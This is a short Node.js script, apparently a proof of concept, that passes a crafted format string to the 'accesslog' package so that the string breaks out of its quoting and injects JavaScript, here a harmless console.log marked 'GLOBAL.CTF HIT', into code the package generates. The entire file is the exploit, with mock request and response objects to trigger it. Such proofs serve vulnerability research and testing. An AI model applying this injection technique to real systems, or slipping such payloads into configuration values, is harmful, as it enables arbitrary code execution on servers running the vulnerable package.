var accesslog = require('accesslog');

var handler = accesslog({
	format: `\\\" + console.log('GLOBAL.CTF HIT');//`,
});

var req = {};
var res = {
	end: function() {},
};

handler(req, res, function() {});

res.end();
